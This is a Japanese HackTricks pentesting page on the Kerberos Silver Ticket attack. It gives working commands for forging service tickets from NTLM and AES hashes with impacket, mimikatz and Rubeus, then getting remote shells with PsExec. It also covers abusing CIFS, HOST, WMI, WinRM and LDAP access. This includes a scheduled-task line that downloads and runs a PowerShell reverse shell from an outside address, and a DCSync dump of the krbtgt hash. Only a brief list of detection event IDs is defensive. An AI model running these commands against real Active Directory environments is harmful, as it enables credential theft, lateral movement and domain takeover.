# シルバーチケット

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

もし、**ハッキングのキャリア**に興味があり、**解読不能なものを解読する**ことに興味があるなら、**採用しています！**（流暢なポーランド語の読み書きが必要です）。

{% embed url="https://www.stmcyber.com/careers" %}

## シルバーチケット

シルバーチケット攻撃は、**サービスのNTLMハッシュ（PCアカウントハッシュなど）を所有している場合に、有効なTGSを作成する**ことに基づいています。したがって、任意のユーザーとしてカスタムTGSを偽造することで、**そのサービスにアクセス**することができます。

この場合、Active Directory（AD）の中でユーザーアカウントのようなものである**コンピューターアカウントのNTLMハッシュ**が**所有**されています。したがって、SMBサービスを介して**管理者権限を持つ**マシンに**入るためのチケット**を**作成**することができます。コンピューターアカウントはデフォルトで30日ごとにパスワードをリセットします。

また、AES Kerberosキー（AES128およびAES256）を使用してチケットを偽造することが可能であり、**推奨されます（opsec）**。AESキーの生成方法については、[MS-KILEのセクション4.4](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625)または[Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)を参照してください。

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
{% endcode %}

Windowsでは、**Mimikatz**を使用して**チケット**を**作成**することができます。次に、チケットは**Rubeus**で**注入**され、最後に**PsExec**のおかげでリモートシェルを取得することができます。

{% code title="Windows" %}
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```
{% endcode %}

**CIFS**サービスは、被害者のファイルシステムにアクセスすることができるものです。他のサービスはこちらで見つけることができます：[**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page\_id=183)**.** 例えば、**HOSTサービス**を使用してコンピューターに_schtask_を作成することができます。その後、被害者のタスクをリストアップして動作しているか確認することができます：`schtasks /S <hostname>`または**HOSTとRPCSSサービス**を使用してコンピューターで**WMI**クエリを実行することもできます。テストするには：`Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`

### 緩和策

SilverチケットイベントID（ゴールデンチケットよりもステルス性が高い）：

* 4624：アカウントログオン
* 4634：アカウントログオフ
* 4672：管理者ログオン

[**ired.teamのSilver Ticketsに関する詳細情報**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

## 利用可能なサービス

| サービスタイプ                               | サービスシルバーチケット                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShellリモート操作                        | <p>HOST</p><p>HTTP</p><p>OSによっては、次のものもあります：</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>場合によっては、WINRMを要求するだけで済むこともあります</p> |
| スケジュールされたタスク                            | HOST                                                                       |
| Windowsファイル共有、またはpsexec            | CIFS                                                                       |
| LDAP操作、DCSyncを含む           | LDAP                                                                       |
| Windowsリモートサーバー管理ツール | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| ゴールデンチケット                             | krbtgt                                                                     |

**Rubeus**を使用すると、次のパラメータを使用してこれらのチケットをすべて要求することができます：

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

## サービスチケットの乱用

以下の例では、チケットが管理者アカウントをなりすまして取得されたと想定しています。

### CIFS

このチケットを使用すると、**SMB**経由で`C$`および`ADMIN$`フォルダにアクセスし（公開されている場合）、リモートファイルシステムの一部にファイルをコピーすることができます。以下のようにします：
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
また、**psexec**を使用してホスト内でシェルを取得したり、任意のコマンドを実行したりすることもできます：

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### ホスト

この権限を持つと、リモートコンピュータでスケジュールされたタスクを生成し、任意のコマンドを実行することができます：
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

これらのチケットを使用すると、**被害者システムでWMIを実行**することができます。
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
以下のページで**wmiexecに関する詳細情報**を見つけることができます：

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

コンピューター上でのwinrmアクセスにより、**それにアクセス**し、PowerShellを取得することさえできます：
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
次のページをチェックして、**winrmを使用してリモートホストに接続する別の方法**を学びましょう：

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
リモートコンピュータにアクセスするためには、**winrmがアクティブでリッスンしている**必要があります。
{% endhint %}

### LDAP

この特権を使用すると、**DCSync**を使用してDCデータベースをダンプできます：
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
以下のページで**DCSync**について詳しく学びましょう：

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

もし**ハッキングのキャリア**に興味があり、**解読不能なものをハック**したい場合は、**採用中です！**（流暢なポーランド語の読み書きが必要です）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
